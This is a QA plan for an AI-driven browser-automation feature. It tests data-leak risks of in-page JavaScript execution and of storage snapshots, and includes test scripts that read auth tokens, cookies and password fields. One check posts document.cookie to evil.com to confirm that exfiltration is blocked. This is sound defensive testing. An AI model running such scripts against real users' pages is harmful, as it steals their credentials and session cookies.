---
status: proposed
scope: feature/ai-web-pilot/qa
ai-priority: medium
tags: [testing, qa]
relates-to: [product-spec.md, tech-spec.md]
last-verified: 2026-03-05
doc_type: qa-plan
feature_id: feature-ai-web-pilot
last_reviewed: 2026-07-05
last_verified_version: 0.7.12
last_verified_date: 2026-03-05
---

# QA Plan: AI Web Pilot

> QA plan for the AI Web Pilot feature. Covers data leak analysis, LLM clarity, simplicity assessment, code-level testing, and step-by-step UAT verification.

---

## 1. Data Leak Analysis

**Goal:** Verify the feature does NOT expose data it shouldn't. Kaboom runs on localhost and data must never leave the machine. AI Web Pilot is HIGH RISK because `execute_js` runs arbitrary JavaScript in page context, and `manage_state` serializes localStorage/sessionStorage/cookies.

| # | Data Leak Risk | What to Check | Severity |
|---|---------------|---------------|----------|
| DL-1 | `execute_js` reads localStorage auth tokens | Run `localStorage.getItem('auth_token')` via execute_js and verify the value is returned only to localhost MCP client, never forwarded externally | critical |
| DL-2 | `execute_js` reads sessionStorage secrets | Run `sessionStorage.getItem('session_secret')` and confirm it stays within the localhost MCP response | critical |
| DL-3 | `execute_js` reads cookies (including HttpOnly) | Run `document.cookie` via execute_js; verify HttpOnly cookies are NOT accessible (browser enforces this, but confirm) | critical |
| DL-4 | `manage_state` save captures auth tokens in snapshot | Save a state snapshot on a page with auth tokens in localStorage; inspect the snapshot object for unredacted secrets | critical |
| DL-5 | `manage_state` load restores credentials to wrong origin | Load a snapshot captured from origin A onto origin B; verify cookies and storage are origin-scoped | high |
| DL-6 | `execute_js` accesses cross-origin iframe data | Run `document.querySelector('iframe').contentDocument` via execute_js targeting a cross-origin iframe; browser should block this | high |
| DL-7 | `highlight_element` leaks DOM text content | Verify highlight response returns only `{ success, selector, bounds }` — no innerHTML, textContent, or attribute values | medium |
| DL-8 | `execute_js` result serialization leaks prototype chain | Run script returning an object with a custom prototype; verify only own enumerable properties are serialized | medium |
| DL-9 | `execute_js` reads password field values | Run `document.querySelector('input[type=password]').value` and confirm the value is returned (expected: yes, localhost-only) but flag if it could be logged | high |
| DL-10 | State snapshots stored in chrome.storage.local are accessible by other extensions | Verify `kaboom_state_snapshots` namespace in chrome.storage.local is not readable by other extensions (Chrome enforces per-extension isolation) | medium |

### Negative Tests (must NOT leak)
- [ ] `execute_js` result must NOT be written to any log file on disk (only returned via MCP stdio)
- [ ] `manage_state` snapshots must NOT include HttpOnly cookie values
- [ ] `highlight_element` response must NOT include element innerHTML or attribute values beyond bounds
- [ ] `execute_js` must NOT allow `fetch()` calls to external URLs as a side effect that exfiltrates data (the script runs in page context, so same-origin policy applies, but verify no bypass)
- [ ] State snapshots must NOT be accessible via any HTTP endpoint (only via MCP tool)

---

## 2. LLM Clarity Assessment

**Goal:** Verify an AI agent reading the tool responses can unambiguously understand the data without misinterpretation.

| # | Clarity Check | What to Verify | Status |
|---|--------------|----------------|--------|
| CL-1 | Opt-in error is actionable | When AI Web Pilot is disabled, error response includes both the error code (`ai_web_pilot_disabled`) and a human-readable instruction to enable it in the popup | [ ] |
| CL-2 | Highlight success vs element-not-found | `highlight_element` returns `{ success: true, bounds }` vs `{ success: false, error: "Element not found" }` — verify the AI can distinguish these | [ ] |
| CL-3 | Execute_js success vs error vs timeout | Three distinct response shapes: `{ success: true, result }`, `{ success: false, error, stack }`, `{ success: false, error: "Execution timed out" }` — verify all three are distinguishable | [ ] |
| CL-4 | State save response includes size | Save response includes `size_bytes` so AI can judge if the snapshot is suspiciously large or empty | [ ] |
| CL-5 | State load response itemizes restoration | Load response shows counts per storage type (`localStorage: 5, sessionStorage: 2, cookies: 3`) so AI knows what was restored | [ ] |
| CL-6 | State list response includes metadata | List response includes name, URL, timestamp, and size for each snapshot — AI can choose which to load | [ ] |
| CL-7 | Execute_js error includes stack trace | When JS throws, the response includes the error message AND stack trace so the AI can diagnose | [ ] |
| CL-8 | Non-serializable result handling | When execute_js returns a non-JSON-serializable value (DOM node, function, circular ref), the error message explains why and suggests returning a primitive | [ ] |

### Common LLM Misinterpretation Risks
- [ ] AI may interpret `highlight_element` bounds `{x:0, y:0, width:0, height:0}` as success when the element is hidden — verify error handling for hidden/zero-size elements
- [ ] AI may call `execute_js` with multi-line scripts containing unescaped quotes — verify the JSON encoding handles this
- [ ] AI may confuse `manage_state` action "save" with "load" — verify error messages reference the attempted action explicitly
- [ ] AI may assume `execute_js` runs in extension context vs page context — verify response metadata clarifies execution context

---

## 3. Simplicity Assessment

**Goal:** Count steps and evaluate cognitive load for both human and AI users.

**Complexity Score:** Medium

| Workflow | Steps Required | Can Be Simplified? |
|----------|---------------|-------------------|
| Highlight an element | 1 step: `interact({action: "highlight", selector: "..."})` | No — already minimal |
| Save and restore state | 2 steps: save, then load | No — inherently two operations |
| Execute JS and get result | 1 step: `interact({action: "execute_js", script: "..."})` | No — already minimal |
| Enable AI Web Pilot | 1 step: human toggles in popup | No — intentional human gate |
| Debug with state restore | 3 steps: save state, make changes, load state to reset | No — minimal for the workflow |
| Check if pilot is enabled | 1 step: call any pilot action, check for opt-in error | Could add `observe({what: "pilot"})` to check status without triggering an error |

### Default Behavior Verification
- [ ] AI Web Pilot is disabled by default (toggle OFF in popup)
- [ ] All pilot tools return structured opt-in error when disabled (not a generic 500)
- [ ] Highlight auto-removes after default duration (5000ms) without cleanup call
- [ ] Execute_js timeout defaults to 5000ms (prevents infinite loops without explicit config)

---

## 4. Code Test Plan

### 4.1 Unit Tests

| # | Test Case | Input | Expected Output | Priority |
|---|-----------|-------|-----------------|----------|
| UT-1 | Highlight handler with valid selector | `{ selector: "#submit-btn", duration_ms: 3000 }` | Pending query created with correct type and payload | must |
| UT-2 | Highlight handler with empty selector | `{ selector: "" }` | Error: "selector is required" | must |
| UT-3 | Execute_js handler with simple expression | `{ script: "1 + 1" }` | Pending query created with script payload | must |
| UT-4 | Execute_js handler with empty script | `{ script: "" }` | Error: "script is required" | must |
| UT-5 | Execute_js handler with timeout override | `{ script: "...", timeout_ms: 2000 }` | Pending query timeout set to 2000 | should |
| UT-6 | Manage_state save handler | `{ action: "save", snapshot_name: "test" }` | Pending query created for state save | must |
| UT-7 | Manage_state with missing action | `{ snapshot_name: "test" }` | Error: "action is required" | must |
| UT-8 | Manage_state load with missing name | `{ action: "load" }` | Error: "snapshot_name is required for load" | must |
| UT-9 | Manage_state list action (no name needed) | `{ action: "list" }` | Pending query created for state list | must |
| UT-10 | Manage_state delete with name | `{ action: "delete", snapshot_name: "old" }` | Pending query created for state delete | should |
| UT-11 | Opt-in check when disabled | Any pilot action with pilot disabled | `{ error: "ai_web_pilot_disabled", message: "..." }` | must |
| UT-12 | Highlight handler with negative duration | `{ selector: "h1", duration_ms: -1 }` | Error or clamped to minimum (e.g., 100ms) | should |

### 4.2 Integration Tests

| # | Test Case | Components Involved | Expected Behavior | Priority |
|---|-----------|--------------------|--------------------|----------|
| IT-1 | Highlight round-trip: MCP tool call to extension response | Server MCP handler, pending query system, extension background.js, inject.js | MCP call creates pending query; extension polls and picks it up; inject.js creates highlighter div; extension responds with bounds; server returns result | must |
| IT-2 | Execute_js round-trip: script execution and result | Server MCP handler, extension content bridge, inject.js page context | Script runs in page context via `new Function()`; result serialized and returned through extension to server to MCP response | must |
| IT-3 | State save/load round-trip | Server, extension, chrome.storage.local | Save captures localStorage + sessionStorage + cookies; load restores them; list shows the snapshot | must |
| IT-4 | Opt-in toggle enforcement | Extension popup, chrome.storage.sync, server MCP handler | Toggle off: all pilot calls return opt-in error. Toggle on: calls proceed | must |
| IT-5 | Highlight auto-cleanup after duration | Server, extension inject.js | Highlighter div appears, then is automatically removed after duration_ms | should |
| IT-6 | Execute_js timeout enforcement | Server, extension inject.js | Script `while(true){}` killed after timeout_ms; error returned | must |
| IT-7 | Track This Page isolates queries to tracked tab | Extension popup, background.js, pending query routing | With tab tracked, pilot commands execute on tracked tab regardless of active tab | should |

### 4.3 Performance Tests

| # | Test Case | Metric | Target | Priority |
|---|-----------|--------|--------|----------|
| PT-1 | Highlight element injection latency | Time from MCP call to div visible in page | < 500ms (including WebSocket roundtrip) | must |
| PT-2 | Execute_js simple expression | Time from MCP call to result returned | < 200ms for `1+1` | must |
| PT-3 | State save with 100 localStorage keys | Time to serialize and store snapshot | < 1000ms | should |
| PT-4 | State load with 100 localStorage keys | Time to restore from snapshot | < 1000ms | should |
| PT-5 | Extension poll overhead | CPU/memory impact of 1s polling for pending queries | < 0.1% CPU, < 1MB memory | must |
| PT-6 | Highlight div does not cause reflow | Page layout stability during highlight | No CLS impact (pointer-events: none, position: fixed) | must |

### 4.4 Edge Case Tests

| # | Edge Case | Input/Scenario | Expected Behavior | Priority |
|---|-----------|---------------|-------------------|----------|
| EC-1 | Highlight element that does not exist | `{ selector: "#nonexistent" }` | `{ success: false, error: "Element not found: #nonexistent" }` | must |
| EC-2 | Highlight element hidden with display:none | `{ selector: ".hidden-el" }` | Returns bounds `{0,0,0,0}` or error indicating element not visible | should |
| EC-3 | Execute_js returns circular reference | `var a = {}; a.self = a; return a;` | Error: "Result is not JSON-serializable" | must |
| EC-4 | Execute_js returns undefined | `return undefined;` | `{ success: true, result: null }` (JSON has no undefined) | should |
| EC-5 | Execute_js returns a Promise | `return new Promise(r => setTimeout(() => r(42), 100))` | Either awaits the promise or returns the promise object — document behavior | should |
| EC-6 | State save when localStorage is empty | Page with no stored data | `{ success: true, size_bytes: ~small }` with empty storage sections | should |
| EC-7 | Multiple rapid highlight calls | 10 highlight calls in 1 second | Each new highlight replaces previous (no stacking) | must |
| EC-8 | Execute_js during page navigation | Script runs while page is navigating away | Timeout or error — not a crash | must |
| EC-9 | Manage_state on chrome:// page | State operations on extension pages | Error: cannot access chrome:// pages | should |
| EC-10 | Highlight with very long duration | `{ duration_ms: 999999999 }` | Should cap at a reasonable maximum or honor it (document behavior) | should |
| EC-11 | Track This Page with closed tab | Tracked tab is closed by user | Auto-clear tracking, fall back to active tab | must |

---

## 5. UAT Checklist (Human + AI)

> Step-by-step verification for a human working with an AI assistant. The AI executes MCP tool calls; the human observes browser behavior and confirms results.

### Prerequisites
- [ ] Kaboom server running: `./dist/kaboom --port 7890`
- [ ] Chrome extension installed and connected (green indicator in popup)
- [ ] AI Web Pilot toggle enabled in extension popup
- [ ] A test page open in Chrome (e.g., localhost:3000 or any web page)

### Step-by-Step Verification

| # | Step (AI executes) | Human Observes | Expected Result | Pass |
|---|-------------------|----------------|-----------------|------|
| UAT-1 | `{"tool": "interact", "arguments": {"action": "highlight", "selector": "h1", "duration_ms": 5000}}` | Red border appears around the h1 element on the page | AI receives `{ success: true, selector: "h1", bounds: { x, y, width, height } }` with non-zero bounds | [ ] |
| UAT-2 | Wait 5 seconds after UAT-1 | Red border disappears automatically | No highlighter div remains in the DOM | [ ] |
| UAT-3 | `{"tool": "interact", "arguments": {"action": "highlight", "selector": "#nonexistent"}}` | No visual change on page | AI receives `{ success: false, error: "Element not found..." }` | [ ] |
| UAT-4 | `{"tool": "interact", "arguments": {"action": "execute_js", "script": "document.title"}}` | No visual change | AI receives `{ success: true, result: "<page title>" }` matching the page title | [ ] |
| UAT-5 | `{"tool": "interact", "arguments": {"action": "execute_js", "script": "window.testGlobal = {v:42}; window.testGlobal.v"}}` | No visual change | AI receives `{ success: true, result: 42 }` | [ ] |
| UAT-6 | `{"tool": "interact", "arguments": {"action": "execute_js", "script": "while(true){}"}}` | No visual change; page may freeze briefly | AI receives timeout error within ~5s | [ ] |
| UAT-7 | `{"tool": "interact", "arguments": {"action": "execute_js", "script": "throw new Error('test fail')"}}` | No visual change | AI receives `{ success: false, error: "test fail", stack: "..." }` | [ ] |
| UAT-8 | `{"tool": "interact", "arguments": {"action": "save_state", "snapshot_name": "uat_test"}}` | No visual change | AI receives `{ success: true, snapshot_name: "uat_test", size_bytes: N }` | [ ] |
| UAT-9 | Human clears localStorage manually in DevTools | localStorage is empty | Confirm localStorage is empty | [ ] |
| UAT-10 | `{"tool": "interact", "arguments": {"action": "load_state", "snapshot_name": "uat_test"}}` | localStorage is restored (check in DevTools) | AI receives `{ success: true, restored: { localStorage: N, ... } }` | [ ] |
| UAT-11 | `{"tool": "interact", "arguments": {"action": "list_states"}}` | No visual change | AI receives list including "uat_test" with metadata | [ ] |
| UAT-12 | `{"tool": "interact", "arguments": {"action": "delete_state", "snapshot_name": "uat_test"}}` | No visual change | AI receives success; subsequent list_states does not include "uat_test" | [ ] |
| UAT-13 | Human disables AI Web Pilot toggle in popup | Toggle switches to OFF | Popup shows toggle as OFF | [ ] |
| UAT-14 | `{"tool": "interact", "arguments": {"action": "execute_js", "script": "1+1"}}` | No visual change | AI receives `{ error: "ai_web_pilot_disabled", message: "Enable 'AI Web Pilot'..." }` | [ ] |
| UAT-15 | Human re-enables AI Web Pilot toggle | Toggle switches to ON | Subsequent pilot calls work again | [ ] |

### Data Leak UAT Verification

| # | Check | Method | Expected | Pass |
|---|-------|--------|----------|------|
| DL-UAT-1 | Execute_js cannot exfiltrate via fetch | Run `fetch('https://evil.com', {method:'POST', body: document.cookie})` via execute_js | Fetch blocked by CORS or returns network error; cookie data never leaves localhost | [ ] |
| DL-UAT-2 | State snapshot stays local | Save state, then check `~/.kaboom/` directory and server HTTP endpoints for snapshot data | Snapshot is ONLY in chrome.storage.local; not on disk; not accessible via HTTP | [ ] |
| DL-UAT-3 | Highlight does not expose content | Highlight a sensitive element (e.g., a password field); check MCP response | Response contains only selector and bounds, not the field value | [ ] |

### Regression Checks
- [ ] Existing `observe` tool still works correctly after pilot feature is enabled
- [ ] Extension polling behavior unchanged (1s interval for pending queries)
- [ ] Console/network/WebSocket capture unaffected by pilot toggle state
- [ ] Track This Page does not interfere with normal observation when tracking is not active

---

## Sign-Off

| Area | Tester | Date | Pass/Fail |
|------|--------|------|-----------|
| Data Leak Analysis | | | |
| LLM Clarity | | | |
| Simplicity | | | |
| Code Tests | | | |
| UAT | | | |
| **Overall** | | | |
